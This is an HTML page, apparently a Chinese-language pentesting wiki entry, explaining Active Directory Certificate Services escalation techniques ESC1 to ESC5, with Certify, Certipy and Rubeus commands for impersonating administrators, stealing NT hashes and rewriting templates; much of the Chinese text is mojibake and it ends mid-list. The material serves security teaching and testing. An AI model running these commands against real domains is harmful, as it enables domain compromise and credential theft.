<!DOCTYPE HTML>
<html lang="zh" class="light sidebar-visible" dir="ltr">
    <head>
        <!-- Book generated using mdBook -->
        <meta charset="UTF-8">
        <title>AD CS Domain Escalation</title>


        <!-- Custom HTML head -->

        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="theme-color" content="#ffffff">

        <link rel="icon" href="../../../favicon.svg">
        <link rel="shortcut icon" href="../../../favicon.png">
        <link rel="stylesheet" href="../../../css/variables.css">
        <link rel="stylesheet" href="../../../css/general.css">
        <link rel="stylesheet" href="../../../css/chrome.css">
        <link rel="stylesheet" href="../../../css/print.css" media="print">

        <!-- Fonts -->
        <link rel="stylesheet" href="../../../FontAwesome/css/font-awesome.css">
        <link rel="stylesheet" href="../../../fonts/fonts.css">

        <!-- Highlight.js Stylesheets -->
        <link rel="stylesheet" href="../../../highlight.css">
        <link rel="stylesheet" href="../../../tomorrow-night.css">
        <link rel="stylesheet" href="../../../ayu-highlight.css">

        <!-- Custom theme stylesheets -->


        <!-- Provide site root to javascript -->
        <script>
            var path_to_root = "../../../";
            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
        </script>
        <!-- Start loading toc.js asap -->
        <script src="../../../toc.js"></script>
    </head>
    <body>
    <div id="body-container">
        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        <script>
            try {
                var theme = localStorage.getItem('mdbook-theme');
                var sidebar = localStorage.getItem('mdbook-sidebar');

                if (theme.startsWith('"') && theme.endsWith('"')) {
                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
                }

                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
                }
            } catch (e) { }
        </script>

        <!-- Set the theme before any content is loaded, prevents flash -->
        <script>
            var theme;
            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
            if (theme === null || theme === undefined) { theme = default_theme; }
            const html = document.documentElement;
            html.classList.remove('light')
            html.classList.add(theme);
            html.classList.add("js");
        </script>

        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">

        <!-- Hide / unhide sidebar before it is displayed -->
        <script>
            var sidebar = null;
            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
            if (document.body.clientWidth >= 1080) {
                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
                sidebar = sidebar || 'visible';
            } else {
                sidebar = 'hidden';
            }
            sidebar_toggle.checked = sidebar === 'visible';
            html.classList.remove('sidebar-visible');
            html.classList.add("sidebar-" + sidebar);
        </script>

        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
            <!-- populated by js -->
            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
            <noscript>
                <iframe class="sidebar-iframe-outer" src="../../../toc.html"></iframe>
            </noscript>
            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
                <div class="sidebar-resize-indicator"></div>
            </div>
        </nav>

        <div id="page-wrapper" class="page-wrapper">

            <div class="page">
                <div id="menu-bar-hover-placeholder"></div>
                <div id="menu-bar" class="menu-bar sticky">
                    <div class="left-buttons">
                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
                            <i class="fa fa-bars"></i>
                        </label>
                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
                            <i class="fa fa-paint-brush"></i>
                        </button>
                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
                        </ul>
                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
                            <i class="fa fa-search"></i>
                        </button>
                    </div>

                    <h1 class="menu-title"></h1>

                    <div class="right-buttons">
                        <a href="../../../print.html" title="Print this book" aria-label="Print this book">
                            <i id="print-button" class="fa fa-print"></i>
                        </a>

                    </div>
                </div>

                <div id="search-wrapper" class="hidden">
                    <form id="searchbar-outer" class="searchbar-outer">
                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
                    </form>
                    <div id="searchresults-outer" class="searchresults-outer hidden">
                        <div id="searchresults-header" class="searchresults-header"></div>
                        <ul id="searchresults">
                        </ul>
                    </div>
                </div>

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                <script>
                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
                    });
                </script>

                <div id="content" class="content">
                    <main>
                        <h1 id="ad-cs-domain-escalation"><a class="header" href="#ad-cs-domain-escalation">AD CS Domain Escalation</a></h1>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>
<p>{% embed url="https://websec.nl/" %}</p>
<p><strong>è¿™æ˜¯å…³äºå‡çº§æŠ€æœ¯éƒ¨åˆ†çš„æ€»ç»“ï¼š</strong></p>
<ul>
<li><a href="https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf">https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf</a></li>
<li><a href="https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7">https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7</a></li>
<li><a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a></li>
</ul>
<h2 id="misconfigured-certificate-templates---esc1"><a class="header" href="#misconfigured-certificate-templates---esc1">Misconfigured Certificate Templates - ESC1</a></h2>
<h3 id="explanation"><a class="header" href="#explanation">Explanation</a></h3>
<h3 id="misconfigured-certificate-templates---esc1-explained"><a class="header" href="#misconfigured-certificate-templates---esc1-explained">Misconfigured Certificate Templates - ESC1 Explained</a></h3>
<ul>
<li><strong>ä¼ä¸š CA æˆäºˆä½æƒé™ç”¨æˆ·æ³¨å†Œæƒã€‚</strong></li>
<li><strong>ä¸éœ€è¦ç»ç†æ‰¹å‡†ã€‚</strong></li>
<li><strong>ä¸éœ€è¦æˆæƒäººå‘˜çš„ç­¾åã€‚</strong></li>
<li><strong>è¯ä¹¦æ¨¡æ¿ä¸Šçš„å®‰å…¨æè¿°ç¬¦è¿‡äºå®½æ¾ï¼Œå…è®¸ä½æƒé™ç”¨æˆ·è·å¾—æ³¨å†Œæƒã€‚</strong></li>
<li><strong>è¯ä¹¦æ¨¡æ¿é…ç½®äº†å®šä¹‰ EKU çš„èº«ä»½éªŒè¯ï¼š</strong></li>
<li>åŒ…å«å®¢æˆ·ç«¯èº«ä»½éªŒè¯ (OID 1.3.6.1.5.5.7.3.2)ã€PKINIT å®¢æˆ·ç«¯èº«ä»½éªŒè¯ (1.3.6.1.5.2.3.4)ã€æ™ºèƒ½å¡ç™»å½• (OID 1.3.6.1.4.1.311.20.2.2)ã€ä»»ä½•ç›®çš„ (OID 2.5.29.37.0) æˆ–æ—  EKU (SubCA) çš„æ‰©å±•å¯†é’¥ä½¿ç”¨ (EKU) æ ‡è¯†ç¬¦ã€‚</li>
<li><strong>æ¨¡æ¿å…è®¸è¯·æ±‚è€…åœ¨è¯ä¹¦ç­¾åè¯·æ±‚ (CSR) ä¸­åŒ…å« subjectAltNameï¼š</strong></li>
<li>å¦‚æœå­˜åœ¨ï¼ŒActive Directory (AD) ä¼˜å…ˆè€ƒè™‘è¯ä¹¦ä¸­çš„ subjectAltName (SAN) è¿›è¡Œèº«ä»½éªŒè¯ã€‚è¿™æ„å‘³ç€é€šè¿‡åœ¨ CSR ä¸­æŒ‡å®š SANï¼Œå¯ä»¥è¯·æ±‚è¯ä¹¦ä»¥å†’å……ä»»ä½•ç”¨æˆ·ï¼ˆä¾‹å¦‚ï¼ŒåŸŸç®¡ç†å‘˜ï¼‰ã€‚è¯·æ±‚è€…æ˜¯å¦å¯ä»¥æŒ‡å®š SAN åœ¨è¯ä¹¦æ¨¡æ¿çš„ AD å¯¹è±¡ä¸­é€šè¿‡ <code>mspki-certificate-name-flag</code> å±æ€§æŒ‡ç¤ºã€‚è¯¥å±æ€§æ˜¯ä¸€ä¸ªä½æ©ç ï¼Œå­˜åœ¨ <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> æ ‡å¿—å…è®¸è¯·æ±‚è€…æŒ‡å®š SANã€‚</li>
</ul>
<p>{% hint style="danger" %}
ä¸Šè¿°é…ç½®å…è®¸ä½æƒé™ç”¨æˆ·è¯·æ±‚å…·æœ‰ä»»ä½•é€‰æ‹©çš„ SAN çš„è¯ä¹¦ï¼Œä»è€Œé€šè¿‡ Kerberos æˆ– SChannel ä»¥ä»»ä½•åŸŸä¸»ä½“çš„èº«ä»½è¿›è¡Œèº«ä»½éªŒè¯ã€‚
{% endhint %}</p>
<p>æ­¤åŠŸèƒ½æœ‰æ—¶è¢«å¯ç”¨ä»¥æ”¯æŒäº§å“æˆ–éƒ¨ç½²æœåŠ¡çš„ HTTPS æˆ–ä¸»æœºè¯ä¹¦çš„å³æ—¶ç”Ÿæˆï¼Œæˆ–ç”±äºç¼ºä¹ç†è§£ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä½¿ç”¨æ­¤é€‰é¡¹åˆ›å»ºè¯ä¹¦ä¼šè§¦å‘è­¦å‘Šï¼Œè€Œå½“å¤åˆ¶ç°æœ‰è¯ä¹¦æ¨¡æ¿ï¼ˆä¾‹å¦‚ï¼Œå¯ç”¨äº† <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> çš„ <code>WebServer</code> æ¨¡æ¿ï¼‰å¹¶ä¿®æ”¹ä»¥åŒ…å«èº«ä»½éªŒè¯ OID æ—¶åˆ™ä¸ä¼šã€‚</p>
<h3 id="abuse"><a class="header" href="#abuse">Abuse</a></h3>
<p>è¦<strong>æŸ¥æ‰¾æ˜“å—æ”»å‡»çš„è¯ä¹¦æ¨¡æ¿</strong>ï¼Œæ‚¨å¯ä»¥è¿è¡Œï¼š</p>
<pre><code class="language-bash">Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
</code></pre>
<p>è¦<strong>åˆ©ç”¨æ­¤æ¼æ´å†’å……ç®¡ç†å‘˜</strong>ï¼Œå¯ä»¥è¿è¡Œï¼š</p>
<pre><code class="language-bash">Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:localadmin
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'ESC1' -upn 'administrator@corp.local'
</code></pre>
<p>ç„¶åæ‚¨å¯ä»¥å°†ç”Ÿæˆçš„ <strong>è¯ä¹¦è½¬æ¢ä¸º <code>.pfx</code></strong> æ ¼å¼ï¼Œå¹¶å†æ¬¡ä½¿ç”¨ <strong>Rubeus æˆ– certipy</strong> è¿›è¡Œ <strong>èº«ä»½éªŒè¯</strong>ï¼š</p>
<pre><code class="language-bash">Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
</code></pre>
<p>WindowsäºŒè¿›åˆ¶æ–‡ä»¶ "Certreq.exe" å’Œ "Certutil.exe" å¯ç”¨äºç”Ÿæˆ PFX: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee</p>
<p>å¯ä»¥é€šè¿‡è¿è¡Œä»¥ä¸‹ LDAP æŸ¥è¯¢æ¥æšä¸¾ AD Forest é…ç½®æ¶æ„ä¸­çš„è¯ä¹¦æ¨¡æ¿ï¼Œç‰¹åˆ«æ˜¯é‚£äº›ä¸éœ€è¦æ‰¹å‡†æˆ–ç­¾åã€å…·æœ‰å®¢æˆ·ç«¯èº«ä»½éªŒè¯æˆ–æ™ºèƒ½å¡ç™»å½• EKUï¼Œå¹¶ä¸”å¯ç”¨äº† <code>CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT</code> æ ‡å¿—çš„æ¨¡æ¿:</p>
<pre><code>(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
</code></pre>
<h2 id="misconfigured-certificate-templates---esc2"><a class="header" href="#misconfigured-certificate-templates---esc2">Misconfigured Certificate Templates - ESC2</a></h2>
<h3 id="explanation-1"><a class="header" href="#explanation-1">Explanation</a></h3>
<p>ç¬¬äºŒä¸ªæ»¥ç”¨åœºæ™¯æ˜¯ç¬¬ä¸€ä¸ªåœºæ™¯çš„å˜ä½“ï¼š</p>
<ol>
<li>ä¼ä¸š CA æˆäºˆä½æƒé™ç”¨æˆ·æ³¨å†Œæƒé™ã€‚</li>
<li>ç¦ç”¨ç»ç†å®¡æ‰¹çš„è¦æ±‚ã€‚</li>
<li>çœç•¥äº†æˆæƒç­¾åçš„éœ€è¦ã€‚</li>
<li>è¯ä¹¦æ¨¡æ¿ä¸Šçš„å®‰å…¨æè¿°ç¬¦è¿‡äºå®½æ¾ï¼Œæˆäºˆä½æƒé™ç”¨æˆ·è¯ä¹¦æ³¨å†Œæƒé™ã€‚</li>
<li><strong>è¯ä¹¦æ¨¡æ¿è¢«å®šä¹‰ä¸ºåŒ…å«ä»»ä½•ç›®çš„ EKU æˆ–æ²¡æœ‰ EKUã€‚</strong></li>
</ol>
<p><strong>ä»»ä½•ç›®çš„ EKU</strong> å…è®¸æ”»å‡»è€…ä»¥ <strong>ä»»ä½•ç›®çš„</strong> è·å–è¯ä¹¦ï¼ŒåŒ…æ‹¬å®¢æˆ·ç«¯è®¤è¯ã€æœåŠ¡å™¨è®¤è¯ã€ä»£ç ç­¾åç­‰ã€‚å¯ä»¥ä½¿ç”¨ä¸ <strong>ESC3</strong> ç›¸åŒçš„ <strong>æŠ€æœ¯</strong> æ¥åˆ©ç”¨æ­¤åœºæ™¯ã€‚</p>
<p>å…·æœ‰ <strong>æ—  EKU</strong> çš„è¯ä¹¦ï¼Œä½œä¸ºä¸‹çº§ CA è¯ä¹¦ï¼Œå¯ä»¥è¢«ç”¨äº <strong>ä»»ä½•ç›®çš„</strong>ï¼Œå¹¶ä¸” <strong>ä¹Ÿå¯ä»¥ç”¨æ¥ç­¾ç½²æ–°è¯ä¹¦</strong>ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ä¸‹çº§ CA è¯ä¹¦æŒ‡å®šä»»æ„ EKU æˆ–å­—æ®µåœ¨æ–°è¯ä¹¦ä¸­ã€‚</p>
<p>ç„¶è€Œï¼Œå¦‚æœä¸‹çº§ CA æœªè¢« <strong><code>NTAuthCertificates</code></strong> å¯¹è±¡ä¿¡ä»»ï¼ˆè¿™æ˜¯é»˜è®¤è®¾ç½®ï¼‰ï¼Œåˆ™ä¸º <strong>åŸŸè®¤è¯</strong> åˆ›å»ºçš„æ–°è¯ä¹¦å°†æ— æ³•æ­£å¸¸å·¥ä½œã€‚å°½ç®¡å¦‚æ­¤ï¼Œæ”»å‡»è€…ä»ç„¶å¯ä»¥åˆ›å»º <strong>å…·æœ‰ä»»ä½• EKU</strong> å’Œä»»æ„è¯ä¹¦å€¼çš„æ–°è¯ä¹¦ã€‚è¿™äº›è¯ä¹¦å¯èƒ½ä¼šè¢« <strong>æ»¥ç”¨</strong> ç”¨äºå¹¿æ³›çš„ç›®çš„ï¼ˆä¾‹å¦‚ï¼Œä»£ç ç­¾åã€æœåŠ¡å™¨è®¤è¯ç­‰ï¼‰ï¼Œå¹¶å¯èƒ½å¯¹ç½‘ç»œä¸­å…¶ä»–åº”ç”¨ç¨‹åºï¼ˆå¦‚ SAMLã€AD FS æˆ– IPSecï¼‰äº§ç”Ÿé‡å¤§å½±å“ã€‚</p>
<p>è¦æšä¸¾ä¸æ­¤åœºæ™¯åŒ¹é…çš„æ¨¡æ¿ï¼Œå¯ä»¥è¿è¡Œä»¥ä¸‹ LDAP æŸ¥è¯¢ï¼š</p>
<pre><code>(&amp;(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
</code></pre>
<h2 id="misconfigured-enrolment-agent-templates---esc3"><a class="header" href="#misconfigured-enrolment-agent-templates---esc3">Misconfigured Enrolment Agent Templates - ESC3</a></h2>
<h3 id="explanation-2"><a class="header" href="#explanation-2">Explanation</a></h3>
<p>è¿™ä¸ªåœºæ™¯ä¸ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªåœºæ™¯ç±»ä¼¼ï¼Œä½†<strong>åˆ©ç”¨</strong>äº†<strong>ä¸åŒçš„ EKU</strong>ï¼ˆè¯ä¹¦è¯·æ±‚ä»£ç†ï¼‰å’Œ<strong>ä¸¤ä¸ªä¸åŒçš„æ¨¡æ¿</strong>ï¼ˆå› æ­¤æœ‰ä¸¤ç»„è¦æ±‚ï¼‰ï¼Œ</p>
<p><strong>è¯ä¹¦è¯·æ±‚ä»£ç† EKU</strong>ï¼ˆOID 1.3.6.1.4.1.311.20.2.1ï¼‰ï¼Œåœ¨å¾®è½¯æ–‡æ¡£ä¸­ç§°ä¸º<strong>Enrollment Agent</strong>ï¼Œå…è®¸ä¸€ä¸ªä¸»ä½“<strong>ä»£è¡¨å¦ä¸€ä¸ªç”¨æˆ·</strong>è¿›è¡Œ<strong>è¯ä¹¦æ³¨å†Œ</strong>ã€‚</p>
<p><strong>â€œenrollment agentâ€<strong>åœ¨è¿™æ ·çš„</strong>æ¨¡æ¿</strong>ä¸­æ³¨å†Œï¼Œå¹¶ä½¿ç”¨ç”Ÿæˆçš„<strong>è¯ä¹¦ä»£è¡¨å…¶ä»–ç”¨æˆ·å…±åŒç­¾ç½² CSR</strong>ã€‚ç„¶åï¼Œå®ƒ<strong>å°†</strong>å…±åŒç­¾ç½²çš„<strong>CSR</strong>å‘é€åˆ° CAï¼Œæ³¨å†Œä¸€ä¸ª<strong>å…è®¸â€œä»£è¡¨æ³¨å†Œâ€çš„æ¨¡æ¿</strong>ï¼ŒCAåˆ™å“åº”ä¸€ä¸ª<strong>å±äºâ€œå…¶ä»–â€ç”¨æˆ·çš„è¯ä¹¦</strong>ã€‚</p>
<p><strong>Requirements 1:</strong></p>
<ul>
<li>ä¼ä¸š CA æˆäºˆä½æƒé™ç”¨æˆ·æ³¨å†Œæƒã€‚</li>
<li>çœç•¥äº†ç»ç†æ‰¹å‡†çš„è¦æ±‚ã€‚</li>
<li>æ²¡æœ‰æˆæƒç­¾åçš„è¦æ±‚ã€‚</li>
<li>è¯ä¹¦æ¨¡æ¿çš„å®‰å…¨æè¿°ç¬¦è¿‡äºå®½æ¾ï¼Œæˆäºˆä½æƒé™ç”¨æˆ·æ³¨å†Œæƒã€‚</li>
<li>è¯ä¹¦æ¨¡æ¿åŒ…æ‹¬è¯ä¹¦è¯·æ±‚ä»£ç† EKUï¼Œå…è®¸ä»£è¡¨å…¶ä»–ä¸»ä½“è¯·æ±‚å…¶ä»–è¯ä¹¦æ¨¡æ¿ã€‚</li>
</ul>
<p><strong>Requirements 2:</strong></p>
<ul>
<li>ä¼ä¸š CA æˆäºˆä½æƒé™ç”¨æˆ·æ³¨å†Œæƒã€‚</li>
<li>ç»ç†æ‰¹å‡†è¢«ç»•è¿‡ã€‚</li>
<li>æ¨¡æ¿çš„æ¶æ„ç‰ˆæœ¬ä¸º 1 æˆ–è¶…è¿‡ 2ï¼Œå¹¶æŒ‡å®šäº†éœ€è¦è¯ä¹¦è¯·æ±‚ä»£ç† EKU çš„åº”ç”¨ç¨‹åºç­–ç•¥å‘è¡Œè¦æ±‚ã€‚</li>
<li>è¯ä¹¦æ¨¡æ¿ä¸­å®šä¹‰çš„ EKU å…è®¸åŸŸèº«ä»½éªŒè¯ã€‚</li>
<li>CA ä¸Šæœªå¯¹æ³¨å†Œä»£ç†åº”ç”¨é™åˆ¶ã€‚</li>
</ul>
<h3 id="abuse-1"><a class="header" href="#abuse-1">Abuse</a></h3>
<p>æ‚¨å¯ä»¥ä½¿ç”¨ <a href="https://github.com/GhostPack/Certify"><strong>Certify</strong></a> æˆ– <a href="https://github.com/ly4k/Certipy"><strong>Certipy</strong></a> æ¥åˆ©ç”¨æ­¤åœºæ™¯ï¼š</p>
<pre><code class="language-bash"># Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
</code></pre>
<p>The <strong>ç”¨æˆ·</strong> who are allowed to <strong>è·å–</strong> an <strong>æ³¨å†Œä»£ç†è¯ä¹¦</strong>, the templates in which enrollment <strong>ä»£ç†</strong> are permitted to enroll, and the <strong>è´¦æˆ·</strong> on behalf of which the enrollment agent may act can be constrained by enterprise CAs. This is achieved by opening the <code>certsrc.msc</code> <strong>ç®¡ç†å•å…ƒ</strong>, <strong>å³é”®ç‚¹å‡» CA</strong>, <strong>ç‚¹å‡»å±æ€§</strong>, and then <strong>å¯¼èˆª</strong> to the â€œEnrollment Agentsâ€ tab.</p>
<p>However, it is noted that the <strong>é»˜è®¤</strong> setting for CAs is to â€œ<strong>ä¸é™åˆ¶æ³¨å†Œä»£ç†</strong>.â€ When the restriction on enrollment agents is enabled by administrators, setting it to â€œRestrict enrollment agents,â€ the default configuration remains extremely permissive. It allows <strong>æ‰€æœ‰äºº</strong> access to enroll in all templates as anyone.</p>
<h2 id="vulnerable-certificate-template-access-control---esc4"><a class="header" href="#vulnerable-certificate-template-access-control---esc4">Vulnerable Certificate Template Access Control - ESC4</a></h2>
<h3 id="è§£é‡Š"><a class="header" href="#è§£é‡Š"><strong>è§£é‡Š</strong></a></h3>
<p>The <strong>å®‰å…¨æè¿°ç¬¦</strong> on <strong>è¯ä¹¦æ¨¡æ¿</strong> defines the <strong>æƒé™</strong> specific <strong>AD å®ä½“</strong> possess concerning the template.</p>
<p>Should an <strong>æ”»å‡»è€…</strong> possess the requisite <strong>æƒé™</strong> to <strong>æ›´æ”¹</strong> a <strong>æ¨¡æ¿</strong> and <strong>å»ºç«‹</strong> any <strong>å¯åˆ©ç”¨çš„é”™è¯¯é…ç½®</strong> outlined in <strong>å…ˆå‰çš„éƒ¨åˆ†</strong>, privilege escalation could be facilitated.</p>
<p>Notable permissions applicable to certificate templates include:</p>
<ul>
<li><strong>æ‰€æœ‰è€…:</strong> Grants implicit control over the object, allowing for the modification of any attributes.</li>
<li><strong>å®Œå…¨æ§åˆ¶:</strong> Enables complete authority over the object, including the capability to alter any attributes.</li>
<li><strong>å†™å…¥æ‰€æœ‰è€…:</strong> Permits the alteration of the object's owner to a principal under the attacker's control.</li>
<li><strong>å†™å…¥ DACL:</strong> Allows for the adjustment of access controls, potentially granting an attacker FullControl.</li>
<li><strong>å†™å…¥å±æ€§:</strong> Authorizes the editing of any object properties.</li>
</ul>
<h3 id="æ»¥ç”¨"><a class="header" href="#æ»¥ç”¨">æ»¥ç”¨</a></h3>
<p>An example of a privesc like the previous one:</p>
<figure><img src="../../../.gitbook/assets/image (814).png" alt=""><figcaption></figcaption></figure>
<p>ESC4 is when a user has write privileges over a certificate template. This can for instance be abused to overwrite the configuration of the certificate template to make the template vulnerable to ESC1.</p>
<p>As we can see in the path above, only <code>JOHNPC</code> has these privileges, but our user <code>JOHN</code> has the new <code>AddKeyCredentialLink</code> edge to <code>JOHNPC</code>. Since this technique is related to certificates, I have implemented this attack as well, which is known as <a href="https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab">Shadow Credentials</a>. Hereâ€™s a little sneak peak of Certipyâ€™s <code>shadow auto</code> command to retrieve the NT hash of the victim.</p>
<pre><code class="language-bash">certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
</code></pre>
<p><strong>Certipy</strong> å¯ä»¥é€šè¿‡å•ä¸ªå‘½ä»¤è¦†ç›–è¯ä¹¦æ¨¡æ¿çš„é…ç½®ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒCertipy å°†è¦†ç›–é…ç½®ï¼Œä½¿å…¶å¯¹ ESC1 <strong>æ˜“å—æ”»å‡»</strong>ã€‚æˆ‘ä»¬è¿˜å¯ä»¥æŒ‡å®š <strong><code>-save-old</code> å‚æ•°ä»¥ä¿å­˜æ—§é…ç½®</strong>ï¼Œè¿™åœ¨æˆ‘ä»¬æ”»å‡»å <strong>æ¢å¤</strong> é…ç½®æ—¶å°†éå¸¸æœ‰ç”¨ã€‚</p>
<pre><code class="language-bash"># Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
</code></pre>
<h2 id="vulnerable-pki-object-access-control---esc5"><a class="header" href="#vulnerable-pki-object-access-control---esc5">Vulnerable PKI Object Access Control - ESC5</a></h2>
<h3 id="explanation-3"><a class="header" href="#explanation-3">Explanation</a></h3>
<p>å¹¿æ³›çš„åŸºäºACLçš„å…³ç³»ç½‘ç»œï¼ŒåŒ…æ‹¬è¯ä¹¦æ¨¡æ¿å’Œè¯ä¹¦é¢å‘æœºæ„ä¹‹å¤–çš„å¤šä¸ªå¯¹è±¡ï¼Œå¯èƒ½ä¼šå½±å“æ•´ä¸ªAD CSç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚è¿™äº›å¯¹è±¡å¯èƒ½æ˜¾è‘—å½±å“å®‰å…¨æ€§ï¼ŒåŒ…æ‹¬ï¼š</p>
<ul>
<li>CAæœåŠ¡å™¨çš„ADè®¡ç®—æœºå¯¹è±¡ï¼Œå¯èƒ½é€šè¿‡S4U2Selfæˆ–S4U2Proxyç­‰æœºåˆ¶è¢«æ”»é™·ã€‚</li>
<li>CAæœåŠ¡å™¨çš„RPC/DCOMæœåŠ¡å™¨ã€‚</li>
